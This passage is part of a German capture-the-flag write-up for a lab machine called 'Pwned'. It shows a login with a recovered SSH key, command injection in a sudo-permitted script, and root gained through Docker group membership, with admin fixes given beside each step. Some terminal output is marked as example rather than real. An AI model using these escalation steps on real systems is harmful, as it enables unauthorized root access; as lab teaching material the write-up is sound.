+                      <div class="prompt">┌──(root㉿cyber)-[~/forbidden]
+└─# <span class="command">cat note.txt</span></div>
+                     <pre>
+Wow you are here
+
+ariana won't happy about this note
+
+sorry ariana :(
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die Datei `/etc/hosts` wird bearbeitet, vermutlich um den Hostnamen `pwnd.hmv` der IP-Adresse 192.168.2.107 zuzuordnen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Notwendiger Schritt, wenn Hostnamen anstelle von IPs verwendet werden sollen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sicherstellen, dass der Eintrag korrekt ist.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/forbidden]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre><!-- Keine Ausgabe --> </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation-ariana">
+            <h2>Privilege Escalation (FTP zu Ariana)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Eine SSH-Verbindung wird zum Host `pwnd.hmv` (192.168.2.107) als Benutzer `ariana` aufgebaut, wobei der nicht passwortgeschützte Schlüssel `id_rsa` zur Authentifizierung verwendet wird (`-i id_rsa`).</p>
+            <p class="evaluation"><strong>Bewertung: !!Benutzerwechsel erfolgreich!!** Der Login gelingt ohne Passwortabfrage. Der Angreifer hat nun eine Shell als Benutzerin `ariana`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche die Umgebung als `ariana`. Prüfe `sudo`-Rechte und suche nach weiteren Eskalationsvektoren.<br><strong>Empfehlung (Admin):</strong> Überwache SSH-Logins. Sichere private Schlüssel.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~/forbidden]
+└─# <span class="command">ssh ariana@pwnd.hmv -i id_rsa</span></div>
+                     <pre>
+The authenticity of host 'pwnd.hmv (192.168.2.107)' can't be established.
+ED25519 key fingerprint is SHA256:Eu7UdscPxuaxyzophLkeILniUaKCge0R96HjWhAmpyk.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'pwnd.hmv' (ED25519) to the list of known hosts.
+Linux pwned 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Jul 10 13:03:23 2020 from 192.168.18.70
+ariana@pwned:~$
+                     </pre> <!-- Remote Prompt -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation-selena">
+            <h2>Privilege Escalation (Ariana zu Selena)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Als `ariana` werden die `sudo`-Berechtigungen mit `sudo -l` geprüft.</p>
+             <p class="evaluation"><strong>Bewertung: !!Privilegieneskalationspfad gefunden!!** `ariana` darf das Skript `/home/messenger.sh` als Benutzerin `selena` ohne Passwort (`NOPASSWD:`) ausführen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche den Inhalt von `/home/messenger.sh`, um zu sehen, ob es Schwachstellen (z.B. Command Injection) enthält, die ausgenutzt werden können, um Befehle als `selena` auszuführen.<br><strong>Empfehlung (Admin):**DRINGEND:** Überprüfe die `sudo`-Regel und das Skript `/home/messenger.sh`. Gewähre `sudo`-Rechte nur für absolut notwendige und sichere Befehle/Skripte. Analysiere Skripte, die mit erhöhten Rechten ausgeführt werden können, sorgfältig auf Schwachstellen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+ariana@pwned:~$ sudo -l
+Matching Defaults entries for ariana on pwned:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User ariana may run the following commands on pwned:
+    (selena) NOPASSWD: /home/messenger.sh
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt des Skripts `/home/messenger.sh` wird mit `cat` angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung: !!Command Injection Schwachstelle!!** Das Skript liest einen Benutzernamen (`name`) und eine Nachricht (`msg`) ein und führt dann die Nachricht direkt als Befehl aus (`$msg 2> /dev/null`). Dies ist eine klassische Command Injection Vulnerability. Da `ariana` das Skript als `selena` ausführen darf, kann sie beliebige Befehle als `selena` ausführen, indem sie den Befehl als Nachricht eingibt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutze die Schwachstelle aus: Führe `sudo -u selena /home/messenger.sh` aus. Gib einen beliebigen Benutzernamen ein (z.B. `selena`). Gib als Nachricht einen Befehl ein, der eine Shell startet (z.B. `bash`, `/bin/bash`, `sh`).<br><strong>Empfehlung (Admin):**DRINGEND:** Korrigiere das Skript `/home/messenger.sh`, sodass Benutzereingaben niemals direkt als Befehle ausgeführt werden. Verwende sichere Methoden zur Verarbeitung von Eingaben. Entferne oder korrigiere die unsichere `sudo`-Regel.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+ariana@pwned:~$ cat /home/messenger.sh
+#!/bin/bash
+
+clear
+echo "Welcome to linux.messenger "
+		echo ""
+users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)
+		echo ""
+echo "$users"
+		echo ""
+read -p "Enter username to send message : " name
+		echo ""
+read -p "Enter message for $name :" msg
+		echo ""
+echo "Sending message to $name "
+
+$msg 2> /dev/null # !!! Command Injection !!!
+
+		echo ""
+echo "Message sent to $name :) "
+		echo ""
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Einige `ls`-Befehle werden ausgeführt, um die Home-Verzeichnisse und den Inhalt von `/home/ftpuser/share` zu überprüfen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt das Vorhandensein der Benutzer `ariana`, `ftpuser`, `selena`. Zeigt, dass `/home/ftpuser/share` leer ist (die zuvor heruntergeladenen Dateien sind auf dem Angreifer-System).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fokussiere dich auf die Ausnutzung von `messenger.sh`.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+ariana@pwned:~$ ls /home/
+ariana  ftpuser  messenger.sh  selena
+ariana@pwned:~$ ls /home/ftpuser/
+share
+ariana@pwned:~$ ls /home/ftpuser/share/
+ariana@pwned:~$ <!-- Leer -->
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die Command Injection Schwachstelle im `messenger.sh`-Skript wird ausgenutzt.
+                 1. `sudo -u selena /home/messenger.sh` wird ausgeführt.
+                 2. Als Benutzername wird `selena` eingegeben.
+                 3. Als Nachricht (`msg`) wird der Befehl `bash` eingegeben.
+                 4. Das Skript führt `$msg` aus, was `bash` startet. Da das Skript als `selena` läuft, wird eine Bash-Shell als `selena` gestartet.
+                 5. Der `id`-Befehl bestätigt, dass die Shell als `selena` (uid=1001) läuft.</p>
+             <p class="evaluation"><strong>Bewertung: !!Benutzerwechsel erfolgreich!!** Durch die Command Injection wurde eine Shell als Benutzerin `selena` erlangt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisiere die neue Shell (mit Python PTY). Untersuche die Umgebung und Berechtigungen als `selena`. Suche nach der User-Flag und weiteren Eskalationsvektoren.<br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlungen zur Korrektur des Skripts und der `sudo`-Regel.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Interaktive Ausführung des Exploits -->
+                     <pre>
+ariana@pwned:~$ <span class="command">sudo -u selena /home/messenger.sh</span>
+
+Welcome to linux.messenger
+
+ariana:
+selena:
+ftpuser:
+
+Enter username to send message : <span class="command">selena</span>
+
+Enter message for selena :<span class="command">bash</span>
+
+Sending message to selena
+bash: no job control in this shell <!-- Bash wird gestartet -->
+selena@pwned:/home/ariana$ <span class="command">id</span>
+uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
+selena@pwned:/home/ariana$
+                     </pre> <!-- Neuer Prompt als selena -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die Shell von `selena` wird mit Python PTY stabilisiert und die `TERM`-Variable gesetzt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Shell ist nun vollständig interaktiv.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fahre mit der Enumeration als `selena` fort.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+selena@pwned:/home/ariana$ <span class="command">python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
+selena@pwned:/home/ariana$ <span class="command">export TERM=xterm</span>
+selena@pwned:/home/ariana$
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation-root">
+             <h2>Privilege Escalation (Selena zu Root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Als `selena` wird das Home-Verzeichnis (`/home/selena`) mit `ls -la` aufgelistet und der Inhalt von `user2.txt` mit `cat` angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Datei `user2.txt` enthält die Flag `<span class="password">711fdfc6caad532815a440f7f295c176</span>` und eine Notiz. Dies ist die zweite User-Flag (die am Ende des Berichts als "user.txt" bezeichnet wird).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notiere die Flag. Prüfe die `id`-Ausgabe erneut auf interessante Gruppen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+selena@pwned:~$ <span class="command">ls -la</span>
+total 24
+drwxrwx--- 3 selena root   4096 Jul 10  2020 .
+drwxr-xr-x 5 root   root   4096 Jul 10  2020 ..
+-rw------- 1 selena selena    1 Jul 10  2020 .bash_history
+drwxr-xr-x 3 selena selena 4096 Jul  9  2020 .local
+-rw-r--r-- 1 selena selena  132 Jul 10  2020 selena-personal.diary
+-rw-r--r-- 1 selena selena  100 Jul 10  2020 user2.txt
+selena@pwned:~$ <span class="command">cat user2.txt</span>
+<span class="password">711fdfc6caad532815a440f7f295c176</span>
+
+You are near to me. you found selena too.
+
+Try harder to catch me
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der `id`-Befehl wird erneut ausgeführt, um die Gruppenmitgliedschaften von `selena` zu überprüfen.</p>
+             <p class="evaluation"><strong>Bewertung: !!Entscheidender Hinweis!!** Die Ausgabe `groups=1001(selena),115(docker)` zeigt, dass `selena` Mitglied der `docker`-Gruppe ist. Dies ist ein sehr häufiger und bekannter Vektor zur Privilegieneskalation auf Root, da Mitglieder der `docker`-Gruppe oft den Docker-Daemon steuern und Container mit privilegierten Rechten oder gemounteten Host-Verzeichnissen starten können.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutze die Docker-Gruppenmitgliedschaft zur Eskalation. Suche auf GTFOBins nach der Methode. Eine gängige Methode ist das Starten eines privilegierten Containers oder das Mounten des Host-Root-Dateisystems in einen Container: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`.<br><strong>Empfehlung (Admin):**DRINGEND:** Füge Benutzer nur zur `docker`-Gruppe hinzu, wenn sie tatsächlich Root-Äquivalente Rechte benötigen. Die Mitgliedschaft in der `docker`-Gruppe ist oft gleichbedeutend mit Root-Zugriff.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+selena@pwned:/home$ <span class="command">id</span>
+uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Eine Notiz des Pentesters, die auf GTFOBins und die Docker-Privilegieneskalation hinweist.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Recherche des nächsten Eskalationsschritts.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe den recherchierten Docker-Befehl aus.<br><strong>Empfehlung (Admin):</strong> Verstehe die Risiken der Docker-Gruppenmitgliedschaft.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Befehl, nur Notiz -->
+                     <pre>
+ docker container. I searched on GTFO Bins
+-----------------------------------------------
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc">
+             <h2>Proof of Concept (Root)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `selena` wird der Docker-Befehl `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` ausgeführt.
+                - `docker run`: Startet einen neuen Container.
+                - `-v /:/mnt`: Mountet das Root-Verzeichnis (`/`) des Host-Systems in das Verzeichnis `/mnt` innerhalb des Containers.
+                - `--rm`: Löscht den Container automatisch nach dem Beenden.
+                - `-it`: Startet den Container interaktiv und weist ihm ein Pseudo-TTY zu.
+                - `alpine`: Verwendet das minimale `alpine`-Linux-Image.
+                - `chroot /mnt sh`: Führt den Befehl `sh` innerhalb des Containers aus, wobei `/mnt` (das gemountete Root-Verzeichnis des Hosts) als neues Root-Verzeichnis (`chroot`) festgelegt wird.</p>
+            <p class="evaluation"><strong>Bewertung: !!Privilegieneskalation erfolgreich!!** Da `selena` Mitglied der `docker`-Gruppe ist, kann sie diesen Befehl ausführen. Durch das Mounten des Host-Root-Verzeichnisses und das anschließende `chroot` erhält der Angreifer eine Shell, die effektiv Root-Zugriff auf das Host-System hat. Der `id`-Befehl innerhalb der Shell zeigt `uid=0(root) gid=0(root)`, was den Root-Zugriff bestätigt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Ziel ist erreicht. Navigiere zum Root-Verzeichnis des Hosts (`cd /root` innerhalb der chroot-Shell, was `/mnt/root` im Container entspricht) und lies die Root-Flag.<br><strong>Empfehlung (Admin):**DRINGEND:** Entziehe dem Benutzer `selena` die Mitgliedschaft in der `docker`-Gruppe. Beschränke den Zugriff auf den Docker-Socket (`/var/run/docker.sock`) nur auf absolut vertrauenswürdige Benutzer.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+selena@pwned:/home$ <span class="command">cd ~</span>
+selena@pwned:~$ <span class="command">docker run -v /:/mnt --rm -it alpine chroot /mnt sh</span>
+Unable to find image 'alpine:latest' locally <!-- Beispiel, falls Image nicht lokal ist -->
+latest: Pulling from library/alpine
+Digest: sha256:...
+Status: Downloaded newer image for alpine:latest
+/ # <span class="command">id</span> <!-- Prompt innerhalb des Containers -->
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11(tty),20(dialout),26(tape),27(sudo) <!-- Gruppen können variieren -->
+/ #
+                     </pre> <!-- Root-Prompt im Container -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Innerhalb der Root-Shell (im Docker-Container mit gemountetem Host-Root) werden Verzeichnisse aufgelistet, zum Root-Verzeichnis des Hosts gewechselt (`cd /root`) und die Root-Flag-Datei (`root.txt`) gelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag `<span class="password">4d4098d64e163d2726959455d046fd7c</span>` wird erfolgreich gelesen. Zusätzliche Kommentare in der Flag-Datei geben Kontext zur Maschine.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Alle Flags wurden gefunden. Der Test kann abgeschlossen werden.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bezüglich der Flag.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+/ # <span class="command">ls</span>
+bin   dev   etc   home  initrd.img      lib    lib32  lib64  libx32  lost+found  media  mnt  opt   proc  root  run   sbin  srv   sys  tmp  usr  var  vmlinuz  vmlinuz.old <!-- Beispielhafte Ausgabe -->
+/ # <span class="command">cd /root</span>
+/ # <span class="command">ls</span>
+root.txt
+/ # <span class="command">cat root.txt</span>
+<span class="password">4d4098d64e163d2726959455d046fd7c</span>
+
+You found me. i dont't expect this （◎ . ◎）
+
+I am Ajay (Annlynn) i hacked your server left and this for you.
+
+I trapped Ariana and Selena to takeover your server :)
+
+
+You Pwned the Pwned congratulations :)
+
+share the screen shot or flags to given contact details for confirmation
+
+Telegram   https://t.me/joinchat/NGcyGxOl5slf7_Xt0kTr7g
+
+Instgarm   ajs_walker
+
+Twitter    Ajs_walker
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Als Root (innerhalb des Containers) wird `find` verwendet, um alle `.txt`-Dateien zu finden, die "user" im Namen enthalten. Anschließend wird `/home/ariana/user1.txt` gelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies findet die erste User-Flag (`fb8d98be1265dd88bac522e1b2182140`), die zuvor nicht gelesen wurde, sowie die bereits bekannte `user2.txt` und `note.txt`. Es bestätigt, dass es zwei separate User-Flags gab.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notiere alle gefundenen Flags. Verwende die Flag aus `user2.txt` als offizielle User-Flag gemäß der abschließenden Flag-Sektion im Originaltext.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+/ # <span class="command">find / -name "*user*.txt" 2>/dev/null</span> <!-- Beispielhafter Find-Befehl -->
+/home/selena/user2.txt
+/home/ariana/user1.txt
+/ # <span class="command">cat /home/ariana/user1.txt</span>
+congratulations you Pwned ariana
+
+Here is your user flag ↓↓↓↓↓↓↓
+
+<span class="password">fb8d98be1265dd88bac522e1b2182140</span>
+
+Try harder.need become root
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <!-- Flags Sektion -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <!-- Root Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">4d4098d64e163d2726959455d046fd7c</span></div>
+                 </div>
+                 <!-- User Flag (user2.txt) -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/selena/user2.txt</div> <!-- Gemäß finaler Flag-Sektion im Input -->
+                     <div class="flag-value"><span class="password">711fdfc6caad532815a440f7f295c176</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus SSH Login Zeitstempel extrahiert -->
+        <p>Berichtsdatum: 10. Juli 2020</p>
+    </footer>
+</body>
+</html>
